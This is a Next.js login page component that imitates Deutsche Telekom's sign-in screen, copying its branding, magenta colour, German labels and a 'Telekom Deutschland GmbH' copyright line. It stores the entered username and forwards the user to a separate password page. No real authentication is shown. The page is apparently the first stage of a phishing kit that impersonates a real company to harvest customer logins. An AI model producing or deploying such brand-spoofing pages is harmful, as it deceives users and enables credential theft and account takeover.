"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Switch } from "@/components/ui/switch"
import { HelpCircle } from "lucide-react"

export default function LoginPage() {
  const router = useRouter()
  const [email, setEmail] = useState("")
  const [rememberEmail, setRememberEmail] = useState(true)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (email.trim()) {
      sessionStorage.setItem("username", email)
      router.push("/password")
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#7a6f6f] via-[#6b7a7f] to-[#5a8a8f] flex flex-col">
      <div className="absolute top-0 left-0 w-20 h-20 md:w-24 md:h-24 bg-[#E20074] flex items-center justify-center">
        <span className="text-white text-4xl md:text-5xl font-bold">T</span>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-lg bg-white rounded-2xl shadow-xl p-8 md:p-12 relative">
          {/* Help Icon */}
          <button className="absolute top-6 right-6 text-gray-600 hover:text-gray-800">
            <HelpCircle className="w-6 h-6" />
          </button>

          {/* Title */}
          <h1 className="text-3xl md:text-4xl font-bold mb-8 md:mb-10 text-black">Telekom Login</h1>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Email Input */}
            <div className="relative">
              <Input
                type="email"
                placeholder="Benutzername"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full h-12 md:h-14 px-4 pr-10 text-base md:text-lg border-gray-300 rounded-lg focus:border-[#E20074] focus:ring-[#E20074]"
                required
              />
              <button
                type="button"
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
              >
                <HelpCircle className="w-5 h-5" />
              </button>
            </div>

            {/* Remember Email Toggle */}
            <div className="flex items-center gap-3">
              <Switch
                checked={rememberEmail}
                onCheckedChange={setRememberEmail}
                className="data-[state=checked]:bg-[#E20074]"
              />
              <span className="text-sm md:text-base text-black">Benutzername merken</span>
              <button type="button" className="text-gray-500 hover:text-gray-700">
                <HelpCircle className="w-4 h-4" />
              </button>
            </div>

            {/* Continue Button */}
            <Button
              type="submit"
              className="w-full h-12 md:h-14 bg-[#E20074] hover:bg-[#C00060] text-white text-base md:text-lg font-semibold rounded-lg"
            >
              Weiter
            </Button>

            {/* Other Login Options */}
            <Button
              type="button"
              variant="outline"
              className="w-full h-12 md:h-14 bg-white border-gray-300 text-black hover:bg-gray-50 text-base md:text-lg font-normal rounded-lg"
            >
              Andere Anmeldeoptionen
            </Button>
          </form>
        </div>
      </div>

      {/* Footer */}
      <footer className="p-4 md:p-6 text-white text-xs md:text-sm">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <p>© Telekom Deutschland GmbH</p>
            <p>26.26.1</p>
          </div>
          <div className="flex gap-4 md:gap-6">
            <a href="#" className="hover:underline">
              Impressum
            </a>
            <a href="#" className="hover:underline">
              Datenschutz
            </a>
          </div>
        </div>
      </footer>
    </div>
  )
}
